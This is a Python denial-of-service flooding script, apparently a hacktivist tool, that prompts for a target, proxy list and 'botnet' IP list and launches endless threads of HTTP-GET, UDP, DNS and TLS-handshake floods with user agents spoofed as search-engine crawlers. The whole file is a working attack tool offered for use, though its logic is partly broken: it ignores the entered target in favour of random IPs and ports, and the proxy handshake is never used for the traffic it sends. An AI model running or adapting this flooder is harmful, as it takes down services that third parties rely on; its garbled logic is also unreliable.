import socket
import socks
import random
import threading
import requests
import time
import urllib.parse

credit = """
\033[1;36m
▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓ 
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░ 
                                         ░                  ░        ░         ░ ░                       ░           
╔════════════════════════╗
║ Created by: CazzySoci  ║
║                        ║
║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
║                        ║
║  We Are AnonCazzySoci  ║
║    •We don't die       ║
║    •We Multiply        ║
║    •Expect us!         ║
╚════════════════════════╝
\033[1;36m
"""

print(credit)
target_url = input("Target url https or http: ")
target_url = urllib.parse.urlparse(target_url).netloc
target_port = input("Target port: ")
# Replace with the target website port
socks5_file = input("Enter name Proxy file: ") # Path to the SOCKS5 proxies file
botnets_file = input("Enter list of IP address file botnets") # Path to the botnets IP addresses file
useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36 Edge/16.16299",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 likeMac OS X) AppleWebKit/133.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/133.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html£©",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
    "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/369.36 (KHTML, like Gecko) Mobile Safari/584.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 likeMac OS X) AppleWebKit/275.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/123.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider/7.0;+http://www.baidu.com/search/spider.html£©",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 6 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
    "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/147.36 (KHTML, like Gecko) Mobile Safari/480.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 likeMac OS X) AppleWebKit/597.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/599.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider/9.0;+http://www.baidu.com/search/spider.html£©",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 8 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
    "Mozilla/5.0 (compatible; bingbot/3.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/254.36 (KHTML, like Gecko) Mobile Safari/225.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 likeMac OS X) AppleWebKit/259.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/296.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 5 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/304.36 (KHTML, like Gecko) Mobile Safari/487.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 likeMac OS X) AppleWebKit/488.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/528.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 1 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/8.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/406.36 (KHTML, like Gecko) Mobile Safari/553.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 likeMac OS X) AppleWebKit/259.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/296.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 5 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/304.36 (KHTML, like Gecko) Mobile Safari/487.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 likeMac OS X) AppleWebKit/488.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/528.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 1 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/8.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/406.36 (KHTML, like Gecko) Mobile Safari/553.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)"
]

def attack_tcp(target_url, target_port, socks5_proxy):
    while True:
        try:
            socks5_host, socks5_port = socks5_proxy.split(":")
            socks5_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socks5_socket.settimeout(3)
            socks5_socket.connect((socks5_host, int(socks5_port)))
            socks5_socket.sendall(b"\x05\x01\x00")
            socks5_response = socks5_socket.recv(2)
            if socks5_response == b"\x05\x00":
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_socket.settimeout(3)
                target_socket.connect((target_url, target_port))
                useragent = random.choice(useragents)
                headers = f"GET / HTTP/1.1\r\nHost: {target_url}\r\nUser-Agent: {useragent}\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\n\r\n"
                target_socket.sendall(headers.encode())
                target_socket.close()
            socks5_socket.close()
        except:
            pass

def attack_udp(target_url, target_port, socks5_proxy):
    while True:
        try:
            socks5_host, socks5_port = socks5_proxy.split(":")
            socks5_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socks5_socket.settimeout(3)
            socks5_socket.connect((socks5_host, int(socks5_port)))
            socks5_socket.sendall(b"\x05\x01\x00")
            socks5_response = socks5_socket.recv(2)
            if socks5_response == b"\x05\x00":
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                target_socket.settimeout(3)
                target_socket.connect((target_url, target_port))
                data = bytes(random.randint(0, 255) for _ in range(4096))
                target_socket.sendall(data)
                target_socket.close()
            socks5_socket.close()
        except:
            pass

def attack_dns_amplification(target_url, target_port, socks5_proxy):
    while True:
        try:
            socks5_host, socks5_port = socks5_proxy.split(":")
            socks5_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socks5_socket.settimeout(3)
            socks5_socket.connect((socks5_host, int(socks5_port)))
            socks5_socket.sendall(b"\x05\x01\x00")
            socks5_response = socks5_socket.recv(2)
            if socks5_response == b"\x05\x00":
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                target_socket.settimeout(3)
                target_socket.connect((target_url, target_port))
                data = b"\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06target\x07website\x03com\x00\x00\x01\x00\x01"
                target_socket.sendall(data)
                target_socket.close()
            socks5_socket.close()
        except:
            pass

def attack_ssl_tls(target_url, target_port, socks5_proxy):
    while True:
        try:
            socks5_host, socks5_port = socks5_proxy.split(":")
            socks5_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socks5_socket.settimeout(3)
            socks5_socket.connect((socks5_host, int(socks5_port)))
            socks5_socket.sendall(b"\x05\x01\x00")
            socks5_response = socks5_socket.recv(2)
            if socks5_response == b"\x05\x00":
                target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                target_socket.settimeout(3)
                target_socket.connect((target_url, target_port))
                target_socket.sendall(b"\x16\x03\x01\x00\x4F\x01\x00\x00\x4B\x03\x03\x0D\xEF\x57\x04\x90\x37\xE9\xC0\xC4\xA7\xA2\x0B\xC6\x1F\x7B\x30\x11\x1A\x5D\xCD\xC2\xE7\x00\x00\x04\x00\xFF\x01\x00\x01\x00\x00\x0A\x00\x08\x00\x06\x00\x17\x00\x18\x00\x19\x00\x0B\x00\x02\x01\x00\x00\x23\x00\x00\x00\x10\x00\x0E\x00\x0C\x02\x68\x32\x08\x68\x74\x74\x70\x2F\x31\x2E\x31\x01\x00\x00\x0D\x00\x18\x00\x16\x04\x03\x05\x03\x06\x03\x08\x07\x08\x08\x08\x09\x08\x0A\x08\x0B\x08\x04\x08\x05\x08\x06\x04\x01\x05\x01\x06\x01\x03\x03\x03\x02\x03\x01\x02\x02\x02")
                target_socket.close()
            socks5_socket.close()
        except:
            pass

def start_attack():
    with open(socks5_file, "r") as f:
        socks5_proxies = f.read().splitlines()
    with open(botnets_file, "r") as f:
        botnet_ips = f.read().splitlines()

    while True:
        target_url = random.choice(botnet_ips)
        target_port = random.randint(1, 65535)
        socks5_proxy = random.choice(socks5_proxies)

        tcp_thread = threading.Thread(target=attack_tcp, args=(target_url, target_port, socks5_proxy))
        tcp_thread.start()

        udp_thread = threading.Thread(target=attack_udp, args=(target_url, target_port, socks5_proxy))
        udp_thread.start()

        dns_thread = threading.Thread(target=attack_dns_amplification, args=(target_url, target_port, socks5_proxy))
        dns_thread.start()

        ssl_thread = threading.Thread(target=attack_ssl_tls, args=(target_url, target_port, socks5_proxy))
        ssl_thread.start()

        time.sleep(2)

start_attack()
